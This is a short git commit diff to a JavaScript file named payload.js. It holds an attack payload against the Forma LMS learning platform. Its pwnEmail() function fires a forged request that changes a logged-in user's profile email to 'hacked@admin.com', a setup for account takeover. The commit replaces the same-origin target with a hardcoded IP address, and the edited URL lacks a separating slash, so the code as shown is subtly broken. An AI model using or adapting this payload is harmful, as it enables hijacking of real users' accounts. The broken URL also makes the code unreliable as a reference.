f48b146bd590e3dd43a85b78697ec8c36bfa2308
paramitasari <57125253+paramitasari@users.noreply.github.com>
2021-07-26 16:02:46 +0700

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,11 +1,11 @@
 
-var target = document.location.host;
+
 var params = "r=lms/profile/show&ap=saveinfo&authentic_request=&up_lastname=&up_firstname=&up_email=hacked@admin.com&user_preference[ui.language]=0&up_signature=&save=Save+changes";
 
 function pwnEmail(){
 
     var xhr = new XMLHttpRequest();
-    xhr.open("GET", "http://" + target + "/formalms/appLms/index.php?"+params, true);
+    xhr.open("GET", "http://3.89.57.89" + "index.php?"+params, true);
     xhr.send(null);
 
 }
